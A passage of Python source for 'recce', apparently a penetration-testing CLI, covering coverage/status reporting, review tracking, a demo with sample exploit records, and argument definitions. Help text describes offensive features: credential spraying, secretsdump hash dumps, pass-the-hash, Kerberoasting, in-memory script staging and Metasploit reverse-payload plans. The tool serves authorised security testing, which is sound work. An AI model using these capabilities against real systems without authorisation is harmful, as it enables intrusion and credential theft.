        print(f"[x] No datastore at {paths['db']}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)  # honor Excel edits before regenerating
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    return 0


def _mark_capability_scanned(store, targets, db: bool = False) -> None:
    """After a deep-service capability runs (smb/ftp/docker/kubernetes/mssql), mark
    each port it actually assessed as vuln-scanned - and the host as db-scanned for a
    database service - so the Checklist auto-checkboxes and coverage reflect the work
    without the tester ticking anything by hand. `targets` is the module's list of
    {ip, port} it probed (including clean ones, so a 'nothing found' probe still counts)."""
    per_host: dict[str, set] = {}
    for t in targets:
        if t.get("ip") and t.get("port"):
            per_host.setdefault(t["ip"], set()).add(int(t["port"]))
    for ip, ports in per_host.items():
        h = store.get_host(ip)
        if h is None:
            continue
        changed = False
        for p in h.ports:
            if p.portid in ports and not p.vuln_scanned:
                p.vuln_scanned = True
                changed = True
        if db and not h.db_scanned:
            h.db_scanned = True
            changed = True
        if changed:
            store.upsert_host(h, merge=False)     # full host loaded -> safe rewrite


def _service_module_coverage(store, hosts) -> list[dict]:
    """Per deep-service-module (mssql/smb/ftp/docker/kubernetes): how many hosts with
    an applicable open port have actually had the module run. 'Run' = the host appears
    in the module's stored analysis targets, or it carries a finding from that source.
    Ordered highest-impact first so `status` surfaces the critical exposures."""
    from . import mssql, smb, ftp, docker, kubernetes as k8s
    mods = [
        ("Docker", "docker", docker.is_docker, "recce docker"),
        ("Kubernetes", "kubernetes", k8s.is_k8s, "recce k8s"),
        ("MSSQL", "mssql", mssql.is_mssql, "recce mssql -u USER -p PASS -d DOM"),
        ("SMB", "smb", smb.is_smb, "recce smb"),
        ("FTP", "ftp", ftp.is_ftp, "recce ftp"),
    ]
    out = []
    for name, key, pred, command in mods:
        applicable = [h for h in hosts if any(pred(p) for p in h.open_ports)]
        covered_ips: set = set()
        blob = store.get_meta(key)
        if blob:
            try:
                for t in (json.loads(blob).get("targets") or []):
                    if t.get("ip"):
                        covered_ips.add(t["ip"])
            except ValueError:
                pass
        for h in hosts:
            if any(v.source == key for v in h.vulns):
                covered_ips.add(h.ip)
        out.append({"name": name, "key": key, "command": command,
                    "applicable": len(applicable),
                    "covered": sum(1 for h in applicable if h.ip in covered_ips)})
    return out


def cmd_status(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)  # pick up latest Excel edits
    tracking = store.get_tracking()
    hosts = store.all_hosts()
    cov = tr.compute_coverage(hosts, tracking)
    labels = {"hosts": "Hosts", "services": "Services", "vulns": "Vulnerabilities",
              "web": "Web", "exploits": "Exploits", "quick_wins": "AD Quick Wins",
              "accounts": "Users & Accounts"}

    def bar(pct):
        f = round(pct / 5)
        return "#" * f + "-" * (20 - f)

    title = store.get_meta("engagement") or "engagement"
    print(f"\n== Coverage: {title} ==\n")

    # Scan issues first - the operator needs to know if anything failed/incomplete.
    counts = store.count_issues()
    if counts.get("total"):
        print(f"  ⚠ {counts['total']} scan issue(s): {counts.get('error', 0)} error, "
              f"{counts.get('warning', 0)} incomplete "
              f"(Overview tab / {paths['log']})")
        for i in store.get_issues()[:8]:
            print(f"      [{i['level'].upper()}] {i['ip']} {i['message']}")
        if counts["total"] > 8:
            print(f"      ... and {counts['total'] - 8} more")
        print()

    o = cov["overall"]
    print(f"  OVERALL      [{bar(o['pct'])}] {o['pct']:3d}%  {o['done']}/{o['total']}")
    print()
    for cat in tr.COVERAGE_CATEGORIES:
        c = cov[cat]
        print(f"  {labels[cat]:<13}[{bar(c['pct'])}] {c['pct']:3d}%  {c['done']}/{c['total']}")

    # Per-step completion, counting only hosts the step applies to.
    def phase_count(step):
        applic = [h for h in hosts if tr.step_applies(h, step)]
        return sum(1 for h in applic if tr.step_auto(h, step)), len(applic)

    def manual_count(step):
        applic = [h for h in hosts if tr.step_applies(h, step)]
        done = sum(1 for h in applic
                   if tracking.get(tr.step_key(step, h.ip), (False, ""))[0])
        return done, len(applic)

    en_d, en_t = phase_count("enum")
    vs_d, vs_t = phase_count("vuln")
    web_d, web_t = phase_count("web")
    db_d, db_t = phase_count("db")
    open_ports = [p for h in hosts for p in h.open_ports]
    scanned_ports = sum(1 for p in open_ports if p.vuln_scanned)
    print("\n  Tool progress (auto) - per step, hosts complete / applicable:")
    print(f"    Enumerated    {en_d}/{en_t}")
    print(f"    Vuln-scanned  {vs_d}/{vs_t}"
          + (f"   ({scanned_ports}/{len(open_ports)} open ports)" if open_ports else ""))
    print(f"    Web           {web_d}/{web_t}   (hosts serving HTTP/HTTPS)")
    print(f"    DB-scanned    {db_d}/{db_t}   (hosts with DB services)")

    # Deep service-module coverage (mssql / smb / ftp / docker / kubernetes): for each
    # module, how many hosts with an applicable service have actually had it run.
    svc_cov = _service_module_coverage(store, hosts)
    shown = [m for m in svc_cov if m["applicable"]]
    if shown:
        print("\n  Service deep-dives (per applicable service) - hosts run / applicable:")
        for m in shown:
            flag = "" if m["covered"] >= m["applicable"] else f"   ! run: {m['command']}"
            print(f"    {m['name']:<13} {m['covered']}/{m['applicable']}{flag}")

    # Manual sign-offs (from your ticks): AD review + the kill-chain.
    ad_d, ad_t = manual_count("ad")
    ac_d, ac_t = manual_count("access")
    cr_d, cr_t = manual_count("creds")
    lat_d, lat_t = manual_count("lateral")
    pe_done = sum(1 for h in hosts if h.privesc_checked)
    print("\n  Manual sign-offs (from your ticks) - hosts done / applicable:")
    print(f"    AD reviewed   {ad_d}/{ad_t}   (domain controllers / directory hosts)")
    print(f"    Access gained {ac_d}/{ac_t}")
    print(f"    Priv-esc      {pe_done}/{len(hosts)}   (post-exploitation performed)")
    print(f"    Creds got     {cr_d}/{cr_t}")
    print(f"    Lateral       {lat_d}/{lat_t}")
    pending = [h.ip for h in hosts if h.enumerated
               and any(not p.vuln_scanned for p in h.open_ports)]
    if pending:
        print(f"    ! still to vuln-scan: {', '.join(pending[:15])}"
              + (" ..." if len(pending) > 15 else ""))

    print("\n  By subnet (hosts reviewed):")
    for subnet, s in sorted(tr.subnet_coverage(hosts, tracking).items()):
        print(f"    {subnet:<20} {s['pct']:3d}%  {s['done']}/{s['total']}")

    # Outstanding high-value items.
    unreviewed_dc = [h for h in ad.domain_controllers(hosts)
                     if not tracking.get(tr.host_key(h.ip), (False, ""))[0]]
    unreviewed_vuln_hosts = [
        h for h in hosts
        if any(v.severity in ("critical", "high") for v in h.vulns)
        and not tracking.get(tr.host_key(h.ip), (False, ""))[0]
    ]
    incomplete = [h for h in hosts if getattr(h, "incomplete_scan", False)]
    if incomplete:
        print("\n  !! INCOMPLETE port sweeps (host-timeout) - these port lists are "
              "PARTIAL, so downstream phases may be missing services:")
        print("     " + ", ".join(h.ip for h in sorted(incomplete, key=lambda x: _ip_key(x.ip))))
        print("     Re-scan with a larger --host-timeout (or --top-ports to narrow "
              "scope) to complete them.")
    if unreviewed_dc:
        print("\n  ! Unreviewed Domain Controllers: "
              + ", ".join(h.ip for h in unreviewed_dc))
    if unreviewed_vuln_hosts:
        print("  ! Unreviewed hosts with high/critical findings: "
              + ", ".join(h.ip for h in sorted(unreviewed_vuln_hosts, key=lambda x: _ip_key(x.ip))))

    # Suggested next step, so you always know what to run.
    o = args.output_dir
    if not hosts:
        nxt = f"recce enum <targets> -o {o}   # nothing scanned yet"
    elif en_d < en_t or vs_d < vs_t:
        nxt = f"recce vulns --unscanned -o {o}   # vuln-scan the rest"
    elif db_t and db_d < db_t:
        nxt = f"recce db -o {o}   # enumerate the databases"
    elif any(m["applicable"] > m["covered"] for m in svc_cov):
        m = next(m for m in svc_cov if m["applicable"] > m["covered"])
        gap = m["applicable"] - m["covered"]
        nxt = (f"{m['command']} -o {o}   # deep-enum {m['name']} "
               f"({gap} applicable host(s) not yet run)")
    elif pe_done < len(hosts):
        nxt = f"recce privesc -o {o}   # build the priv-esc playbook"
    else:
        nxt = "all phases complete - review the workbook and tick Reviewed."
    print(f"\n  Next: {nxt}")
    print()
    store.close()
    return 0


def cmd_review(args: argparse.Namespace) -> int:
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)  # capture pending Excel edits first
    reviewed = not args.undo
    keys: list[str] = []

    for ip in args.host or []:
        keys.append(tr.host_key(ip))
        if args.cascade:  # also mark all that host's services
            h = store.get_host(ip)
            if h:
                keys += [tr.svc_key(ip, p.protocol, p.portid) for p in h.open_ports]
    for spec in args.service or []:
        ip, _, port = spec.partition(":")
        keys.append(tr.svc_key(ip, "tcp", int(port)))
    keys += args.key or []

    if not keys:
        print("[x] Nothing to mark. Use --host, --service ip:port, or --key.")
        store.close()
        return 1
    for k in keys:
        store.set_reviewed(k, reviewed, notes=args.note)
    print(f"[+] Marked {len(keys)} item(s) as {'reviewed' if reviewed else 'not reviewed'}.")
    _generate_reports(store, paths, store.get_meta("engagement") or args.title, quiet=True)
    store.close()
    return 0


# --- demo command ----------------------------------------------------------------

def cmd_demo(args: argparse.Namespace) -> int:
    sample = os.path.join(os.path.dirname(__file__), "sample_scan.xml")
    if not os.path.exists(sample):
        print("[x] Sample XML missing.")
        return 1
    paths = _open_paths(args.output_dir)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    store.set_meta("engagement", "DEMO engagement")
    store.set_scope("10.0.10.0/24", 254)   # demo scope: three /24s
    store.set_scope("10.0.20.0/24", 254)
    store.set_scope("10.0.30.0/24", 254)   # in scope but no live hosts found
    from .models import Exploit
    from .targets import _subnet_of
    # Stand-in for searchsploit output (unavailable offline in the demo).
    demo_exploits = {
        "10.0.20.6": [Exploit(ip="10.0.20.6", port=21, product="vsftpd", version="2.3.4",
                              edb_id="17491", title="vsftpd 2.3.4 - Backdoor Command Execution",
                              type="remote", path="unix/remote/17491.rb",
                              cves=["CVE-2011-2523"])],
        "10.0.20.5": [Exploit(ip="10.0.20.5", port=80, product="Apache httpd", version="2.4.41",
                              edb_id="50383", title="Apache 2.4.49/2.4.50 - Path Traversal & RCE",
                              type="webapps", path="multiple/webapps/50383.sh",
                              cves=["CVE-2021-41773", "CVE-2021-42013"])],
    }
    for h in np.parse_nmap_xml(sample):
        h.subnet = _subnet_of(h.ip)
        ad.identify_roles(h)
        ad.parse_signing_and_ntlm(h)
        h.exploits = demo_exploits.get(h.ip, [])
        from . import vulndb
        vulndb.assess_host_inplace(h)   # offline version->CVE findings
        h.enumerated = True
        # Leave one host enumerated-only to show the Checklist's mixed states.
        if h.ip != "10.0.20.6":
            for p in h.ports:
                p.vuln_scanned = True
            h.db_scanned = True
            h.privesc_checked = True
        store.upsert_host(h)
    _generate_reports(store, paths, "DEMO engagement")
    store.close()
    print("[+] Demo reports generated from bundled sample scan.")
    return 0


def _add_common(pp) -> None:
    # The two flags almost every run actually uses stay in the default section so
    # they're the first thing `-h` shows; the tuning knobs fold into a labelled
    # group below so the help reads as "here's the one flag you need, advanced
    # stuff is over there" instead of a flat wall.
    pp.add_argument("-o", "--output-dir", default="engagement",
                    help="output directory (default: ./engagement)")
    pp.add_argument("--title", default="Recce Engagement",
                    help="engagement title shown in reports")
    g = pp.add_argument_group("output & performance (optional)")
    g.add_argument("--profile", choices=list(scanner.PROFILES), default="standard",
                   help="scan depth preset (default: standard)")
    g.add_argument("--workers", type=int, default=6,
                   help="concurrent hosts to scan at once (default: 6)")
    g.add_argument("--refresh-every", type=int, default=10, metavar="N",
                   help="regenerate reports every N hosts (0 to disable; default 10)")
    g.add_argument("--host-timeout", type=int, metavar="MIN",
                   help="per-host time ceiling in minutes; nmap gives up on a "
                        "host after this and moves on (0 = no limit)")


def _add_creds(pp) -> None:
    # The three you reach for (user / pass / domain) are grouped together; the
    # privileged-account and LDAP-tuning flags fold into a second group so the
    # simple credentialed run (`-u USER -p PASS -d DOMAIN`) isn't buried.
    g = pp.add_argument_group("credentials")
    g.add_argument("-u", "--username",
                   help="user account for authenticated SMB/LDAP/WinRM. Domain-"
                        "qualified forms work too: 'CORP\\user', 'corp.local/user', "
                        "or 'user@corp.local' (splits out the domain, so -d is "
                        "optional then)")
    g.add_argument("-p", "--password", help="password for the user account")
    g.add_argument("-d", "--domain",
                   help="AD domain (e.g. corp.local) for authentication; overrides "
                        "any domain embedded in -u")
    a = pp.add_argument_group("privileged & LDAP (optional)")
    a.add_argument("--admin-user", dest="admin_username",
                   help="privileged/superuser account: runs the admin-only checks "
                        "(confirm local-admin reach, secretsdump hash dump)")
    a.add_argument("--admin-pass", dest="admin_password",
                   help="password for the privileged account")
    a.add_argument("--admin-domain", dest="admin_domain",
                   help="domain for the privileged account (defaults to -d)")
    a.add_argument("--ldap-enum", action="store_true",
                   help="credentialed LDAP enumeration of discovered DCs")
    a.add_argument("--ldap-anon", action="store_true", help="attempt anonymous LDAP bind")
    a.add_argument("--ldap-ssl", action="store_true", help="use LDAPS (636)")
    a.add_argument("--dc-ip", help="target this DC IP for LDAP instead of auto-detect")


def _add_discovery(pp) -> None:
    # `targets` plus the one or two flags a normal sweep uses (-Pn, --fast) sit up
    # top; the rest are scan internals you only reach for on a difficult network,
    # folded into a labelled group so `enum -h` opens with what you actually type.
    pp.add_argument("targets", nargs="+", help="CIDRs / ranges / IPs / hostnames, or @file")
    pp.add_argument("-Pn", "--no-discovery", action="store_true", dest="no_discovery",
                    help="skip the ping sweep and scan every target as if up (like "
                         "nmap -Pn). Use this when hosts block ping - common on "
                         "firewalled / Windows / AD networks.")
    pp.add_argument("--fast", action="store_true",
                    help="go fast: masscan network-wide sweep instead of per-host "
                         "nmap (and, in `scan`, top-signal vuln scripts only)")
    g = pp.add_argument_group("scan tuning (optional)")
    g.add_argument("--exclude", nargs="*", help="hosts/CIDRs to exclude")
    g.add_argument("--masscan", action="store_true", help="use masscan for port sweep")
    g.add_argument("--all-ports", action="store_true", help="force full 65535 TCP sweep")
    g.add_argument("--top-ports", type=int, help="scan only top-N TCP ports")
    g.add_argument("--min-rate", type=int, help="nmap --min-rate override")
    g.add_argument("--max-retries", type=int, metavar="N",
                   help="nmap --max-retries on the port sweep (default 3; raise for "
                        "lossy links, lower for speed on clean ones)")
    g.add_argument("--no-verify", action="store_true",
                   help="skip the confirmation re-scan of hosts that come back with "
                        "0 open ports (faster; may trust a missed sweep)")
    g.add_argument("--verify-all", action="store_true",
                   help="also re-verify 0-port hosts under -Pn (not just discovered-"
                        "live ones) - catches every missed sweep, slower on dead-IP "
                        "scopes")
    g.add_argument("--reliable", action="store_true",
                   help="rate-limited / lossy network: drop the --min-rate floor, "
                        "retry dropped probes more, let nmap's congestion control "
                        "adapt (recce also switches to this automatically when it "
                        "sees nmap dropping probes)")
    g.add_argument("--no-ad", action="store_true", help="skip SMB/LDAP AD scripts")
    g.add_argument("--no-os", action="store_true", help="skip OS detection")
    g.add_argument("--version-all", action="store_true",
                   help="max-effort service detection (--version-all: every probe)")
    g.add_argument("--version-intensity", type=int, metavar="0-9",
                   help="nmap -sV probe intensity for service detection (default 8)")
    g.add_argument("--resume", action="store_true", help="skip hosts already in datastore")


def _add_vuln_opts(pp) -> None:
    g = pp.add_argument_group("vuln-scan tuning (optional)")
    g.add_argument("--aggressive", action="store_true",
                   help="run the full intrusive NSE 'vuln' category (can crash "
                        "fragile services); default is deep safe detection")
    g.add_argument("--offline", action="store_true",
                   help="airgapped: disable internet-dependent NSE (vulners)")
    g.add_argument("--no-searchsploit", action="store_true",
                   help="skip offline exploit mapping via searchsploit")
    g.add_argument("--no-probes", action="store_true",
                   help="skip the active stdlib probes (HTTP-header / TLS "
                        "enrichment + the service-detection banner grabs); the free "
                        "passive naming (servicefp mining + curated port map) stays on")
    g.add_argument("--udp-top", type=int, help="also scan top-N UDP ports")


def build_arg_parser() -> argparse.ArgumentParser:
    from . import __version__
    p = argparse.ArgumentParser(
        prog="recce",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Phased enumeration & reporting for pentest engagements. "
                    "Scans fill an Excel workbook you check off as you go.",
        epilog=(
            "typical engagement:\n"
            "  1. recce doctor                     # verify this box\n"
            "  2. recce enum 10.0.0.0/24 -o eng    # discover + services\n"
            "  3. open eng/enumeration.xlsx -> Start Here tab\n"
            "  4. recce vulns -o eng               # vuln-scan open ports\n"
            "  5. recce db -o eng ; recce privesc -o eng\n"
            "  6. recce status -o eng              # what's left\n\n"
            "targets: single IP, several IPs, range (10.0.0.10-40), CIDR, or @file.\n"
            "run 'recce <command> -h' for a command's options."
        ),
    )
    p.add_argument("-V", "--version", action="version",
                   version=f"recce {__version__}")
    sub = p.add_subparsers(dest="command", required=False, metavar="<command>")

    # Phase 1: fast enumeration -> sheet.
    e = sub.add_parser("enum", help="discover hosts, scan ports, ID services -> sheet")
    _add_discovery(e)
    _add_common(e)
    _add_creds(e)
    e.set_defaults(func=cmd_enum)

    # Phase 2: targeted vuln scanning of open ports already in the datastore.
    v = sub.add_parser("vulns", help="vuln-scan open ports found by `enum`")
    v.add_argument("targets", nargs="*",
                   help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(v)
    _add_vuln_opts(v)
    _add_creds(v)
    v.add_argument("--fast", action="store_true",
                   help="top-signal detection scripts only (skip the broad "
                        "'vuln and safe' net + deep enum) - much quicker on a /24, "
                        "shows live per-host progress + ETA")
    v.add_argument("--only", nargs="*", metavar="SVC",
                   help="only ports matching these service names / port numbers "
                        "(e.g. http smb 445)")
    v.add_argument("--unscanned", action="store_true",
                   help="only ports not already vuln-scanned")
    v.set_defaults(func=cmd_vulns)

    # Phase 2 (databases): DB-specific enumeration + vuln scan.
    dbp = sub.add_parser("db", help="database enumeration + vuln scan")
    dbp.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(dbp)
    dbp.add_argument("--aggressive", action="store_true",
                     help="intrusive DB checks (brute / xp_cmdshell / hash dump)")
    dbp.add_argument("--no-searchsploit", action="store_true")
    _add_creds(dbp)
    dbp.set_defaults(func=cmd_db)

    # Phase 3 (priv-esc): playbook + optional remote checks.
    pep = sub.add_parser("privesc", help="priv-esc playbook (Windows/Linux) + checks")
    pep.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(pep)
    pep.add_argument("--scan", action="store_true",
                     help="also run remote privesc NSE checks (smb-vuln-* etc.)")
    pep.add_argument("--aggressive", action="store_true",
                     help="include intrusive privesc NSE (may crash services)")
    _add_creds(pep)
    pep.set_defaults(func=cmd_privesc)

    # Phase 3 (credentialed): authenticated enum via netexec / impacket / ssh.
    cep = sub.add_parser("credenum",
                         help="credentialed enum (netexec/impacket/ssh) - needs creds")
    cep.add_argument("targets", nargs="*",
                     help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(cep)
    _add_creds(cep)
    cep.add_argument("--ssh-user", help="username for SSH local checks on Linux hosts")
    cep.add_argument("--ssh-pass", help="SSH password (needs sshpass on PATH)")
    cep.add_argument("--ssh-key", help="SSH private-key path for local checks")
    cep.add_argument("--aggressive", action="store_true",
                     help="also dump hashes with secretsdump (needs admin/DA)")
    cep.set_defaults(func=cmd_credenum)

    # deploy: push + run the read-only local-enum / priv-esc scripts across every
    # host we have creds for (SSH / WinRM / SMB), then fold the results in.
    dp = sub.add_parser("deploy",
                        help="mass local-enum + priv-esc: run recce-enum.sh/.ps1 on "
                             "every host you have creds for (SSH/WinRM/SMB)")
    dp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    _add_common(dp)
    _add_creds(dp)
    dg = dp.add_argument_group("deploy options (optional)")
    dg.add_argument("--ssh-user", help="username for SSH (Linux hosts)")
    dg.add_argument("--ssh-pass", help="SSH password (needs sshpass on PATH)")
    dg.add_argument("--ssh-key", help="SSH private-key path")
    dg.add_argument("--hash", help="NTLM hash for pass-the-hash (SMB/WinRM), with -u")
    dg.add_argument("--stager", action="store_true",
                    help="Windows hosts fetch + run the script IN MEMORY from a "
                         "short-lived local HTTP server (no temp file, any size); "
                         "auto-falls-back to the push path if a host can't reach you")
    dg.add_argument("--lhost", help="your IP that targets route back to (for "
                                    "--stager; autodetected if omitted)")
    dg.add_argument("--no-validate", action="store_true",
                    help="skip the nxc credential precheck (select transport from "
                         "open ports only)")
    dg.add_argument("--timeout", type=int, metavar="SEC",
                    help="per-host remote-exec ceiling (default 300s)")
    dg.add_argument("--dry-run", action="store_true",
                    help="show the per-host transport plan and exit; run nothing")
    dp.set_defaults(func=cmd_deploy)

    # Reporting: per-finding Word write-ups from the template.
    wu = sub.add_parser("writeups",
                        help="generate one Word (.docx) write-up per finding")
    wu.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    wu.add_argument("-o", "--output-dir", default="engagement")
    wu.add_argument("--title", default="Recce Engagement",
                    help="engagement title shown on the combined report")
    wu.add_argument("--min-severity", default="low",
                    choices=["critical", "high", "medium", "low", "info"],
                    help="only findings at or above this severity (default: low - "
                         "excludes informational items; use 'info' to include them)")
    wu.add_argument("--include-potential", action="store_true",
                    help="also write up low-confidence, version-inferred 'potential' "
                         "findings (default: real findings only - those confirmed by "
                         "an actual check/observation)")
    wu.add_argument("--no-screenshots", action="store_true",
                    help="don't auto-capture web screenshots (add them in Word)")
    wu.add_argument("--no-combined", action="store_true",
                    help="skip the single combined findings_report.docx")
    wu.add_argument("--overwrite", action="store_true",
                    help="regenerate even where a write-up exists (loses tester edits)")
    wu.set_defaults(func=cmd_writeups)

    # Single-finding write-up, pre-filled with what's already looted/obtained.
    w1 = sub.add_parser("writeup",
                        help="write up ONE finding (pre-filled with looted/obtained "
                             "evidence); run with no selector to list findings")
    w1.add_argument("selector", nargs="?",
                    help="which finding: an F-id (F-007 / 7), a CVE, an IP or IP:port, "
                         "or a word from its title. Omit to list all findings.")
    w1.add_argument("-o", "--output-dir", default="engagement")
    w1.add_argument("--no-screenshots", action="store_true",
                    help="don't auto-capture web screenshots (add them in Word)")
    w1.add_argument("--overwrite", action="store_true",
                    help="regenerate even if this write-up already exists")
    w1.set_defaults(func=cmd_writeup)

    # Bridge: per-open-port enumeration commands from recce/scripts/.
    sv = sub.add_parser("services",
                        help="print the per-service enum command to run for every "
                             "open port recce found (bridges to recce/scripts/)")
    sv.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    sv.add_argument("-o", "--output-dir", default="engagement")
    sv.add_argument("-a", "--aggressive", action="store_true",
                    help="append -a to each command (enable the intrusive checks)")
    sv.set_defaults(func=cmd_services)

    # Deep web enumeration: fingerprint + non-intrusive checks on every HTTP(S) port.
    wb = sub.add_parser("web",
                        help="deep-enumerate web endpoints (tech fingerprint + "
                             "exposed .git/.env, actuator, methods, headers/TLS)")
    wb.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    wb.add_argument("-o", "--output-dir", default="engagement")
    wb.add_argument("--title", default="Recce Engagement")
    wb.add_argument("--workers", type=int, default=6,
                    help="concurrent hosts to scan at once (default: 6)")
    wb.add_argument("--no-active", action="store_true",
                    help="passive only: headers/TLS fingerprint, skip the path/method "
                         "probes (no requests beyond the root)")
    wb.add_argument("--cookie", help="Cookie header to scan as an authenticated user "
                                     "(e.g. 'session=abc123')")
    wb.add_argument("--header", action="append", metavar="K: V",
                    help="extra request header, repeatable (e.g. --header "
                         "'Authorization: Bearer <token>')")
    wb.add_argument("--screenshots", action="store_true",
                    help="also capture a headless-browser screenshot per endpoint "
                         "-> engagement/screenshots/ (needs chromium/firefox)")
    wb.add_argument("--creds", action="store_true",
                    help="also try a tiny documented default-credential list against "
                         "HTTP Basic-auth endpoints (lockout-aware, <=5 tries/endpoint)")
    wb.add_argument("--crawl", action="store_true",
                    help="same-origin crawl each site (authenticated with --cookie/"
                         "--header): discover pages/params/forms, test discovered "
                         "params for reflection/SSTI, flag cleartext-login / no-CSRF forms")
    wb.set_defaults(func=cmd_web)

    # Per-finding exploitation plan: runnable artifacts driving existing tools.
    ep = sub.add_parser("exploitplan",
                        help="generate ready-to-run exploitation artifacts (msf .rc + "
                             "tool commands) for confirmed findings, params pre-filled")
    ep.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    ep.add_argument("-o", "--output-dir", default="engagement")
    ep.add_argument("--lhost", default="<LHOST>",
                    help="your callback IP for reverse payloads (fills LHOST in the "
                         ".rc files)")
    ep.add_argument("--lport", type=int, default=4444, help="callback port (default 4444)")
    ep.add_argument("--run", action="store_true",
                    help="arm the Metasploit launch lines (default: check-only, safe). "
                         "Use ONLY within your rules of engagement.")
    ep.set_defaults(func=cmd_exploitplan)

    # Proof / verification: is a flagged finding real or a false positive?
    pv = sub.add_parser("prove",
                        help="prove out findings - verdict (real / false-positive / "
                             "needs-PoC) + the exact safe check, per finding")
    pv.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    pv.add_argument("-o", "--output-dir", default="engagement")
    pv.add_argument("--title", default="Recce Engagement")
    pv.add_argument("--profile", choices=list(scanner.PROFILES), default="standard")
    pv.add_argument("--run", action="store_true",
                    help="also re-run the NON-INTRUSIVE detection NSE (SMB "
                         "security-mode / ms17-010) to move verdicts from LIKELY to "
                         "CONFIRMED / FALSE POSITIVE on real evidence")
    pv.set_defaults(func=cmd_prove)

    # Attack-path synthesis: chain confirmed findings into a staged path.
    ap = sub.add_parser("attackpath",
                        help="chain confirmed findings into a prioritised attack path "
                             "(foothold -> priv-esc -> creds -> lateral -> domain)")
    ap.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all)")
    ap.add_argument("-o", "--output-dir", default="engagement")
    ap.set_defaults(func=cmd_attackpath)

    # Credential stacking + spray planning.
    cd = sub.add_parser("creds",
                        help="stack captured credentials and build a netexec/impacket "
                             "spray plan across the discovered surface")
    cd.add_argument("targets", nargs="*",
                    help="restrict spray targets to these IPs / ranges / CIDRs / @file")
    cd.add_argument("-o", "--output-dir", default="engagement")
    cd.add_argument("--add", action="append", metavar="USER:SECRET",
                    help="add a captured credential: 'user:secret', "
                         "'DOMAIN\\user:secret' (a 32-hex secret => NT hash). Repeatable.")
    cd.add_argument("--user", help="add a credential: username")
    cd.add_argument("--pass", dest="password", help="add a credential: password")
    cd.add_argument("--hash", help="add a credential: NT hash (for pass-the-hash)")
    cd.add_argument("--domain", help="add a credential: AD domain (blank = local)")
    cd.add_argument("--plan", action="store_true",
                    help="build the spray plan (write users/passwords/hashes files "
                         "+ print the netexec/impacket commands)")
    cd.set_defaults(func=cmd_creds)

    # Convenience: enum + vulns in one shot.
    s = sub.add_parser("scan", help="run enum then vulns in one shot")
    _add_discovery(s)
    _add_common(s)
    _add_vuln_opts(s)
    _add_creds(s)
    s.set_defaults(func=cmd_scan)

    # Fold on-target recce-enum.sh/.ps1 output into the Priv-Esc sheet.
    ing = sub.add_parser("ingest",
                         help="fold on-target recce-enum.sh/.ps1 output into Priv-Esc")
    ing.add_argument("loot", help="path to saved recce-enum output (-o / -OutFile file)")
    ing.add_argument("--host", help="attach findings to this IP (default: match the "
                                    "loot's hostname, else a 'local:<host>' entry)")
    ing.add_argument("-o", "--output-dir", default="engagement")
    ing.add_argument("--title", default="Recce Engagement")
    ing.set_defaults(func=cmd_ingest)

    # Import an existing nmap scan (XML / grepable) -> workbook, no scanning.
    imp = sub.add_parser("import",
                         help="import an existing nmap scan (-oX / -oG / -oN) -> sheet")
    imp.add_argument("files", nargs="+",
                     help="nmap .xml / .gnmap / .nmap file(s), a directory, or a glob")
    imp.add_argument("-o", "--output-dir", default="engagement")
    imp.add_argument("--title", default="Recce Engagement",
                     help="engagement title (only used when starting a fresh datastore)")
    imp.add_argument("--enum-only", action="store_true",
                     help="mark hosts enumerated only; don't auto-mark ports vuln-scanned "
                          "even if the imported scan ran NSE scripts")
    imp.add_argument("--searchsploit", action="store_true",
                     help="also map exploits via searchsploit (needs the tool)")
    imp.set_defaults(func=cmd_import)

    # Import SharpHound and/or Certipy (ADCS) output -> AD findings + paths to DA.
    bhp = sub.add_parser("ad", aliases=["bloodhound"],
                         help="import SharpHound + Certipy (ADCS) data -> AD vulns, "
                              "ESC findings + paths to Domain Admin")
    bhp.add_argument("paths", nargs="+",
                     help="SharpHound output (.zip / dir / .json) and/or a Certipy "
                          "find -json file - pass any mix; each is auto-detected")
    bhp.add_argument("-u", "--username",
                     help="your account - attack paths start from it, and every "
                          "command is pre-filled with it. Domain-qualified forms "
                          "('CORP\\alice', 'alice@corp.local') work too")
    bhp.add_argument("-p", "--password", help="password for your account")
    bhp.add_argument("-d", "--domain", help="AD domain (e.g. corp.local)")
    bhp.add_argument("--dc-ip", help="DC IP to fill into the staged commands")
    bhp.add_argument("--owned", action="append", metavar="USER[,USER...]",
                     help="override the path start set with these principal(s) "
                          "(repeatable / comma-separated)")
    bhp.add_argument("--creds", metavar="DOMAIN/user:secret",
                     help="alternative to -u/-p/-d; an NT hash if it's 32 hex chars")
    bhp.add_argument("--replace-ad", action="store_true",
                     help="clear previously-imported AD/ESC findings on the DC host "
                          "before folding this import, so remediated items disappear "
                          "(default: accumulate across imports)")
    bhp.add_argument("--roast", action="store_true",
                     help="LIVE: run impacket-GetUserSPNs -request to capture real "
                          "TGS-REP (Kerberoast) hashes (needs creds + --dc-ip)")
    bhp.add_argument("--asrep", action="store_true",
                     help="LIVE: run impacket-GetNPUsers -request to capture real "
                          "AS-REP hashes for pre-auth-disabled accounts")
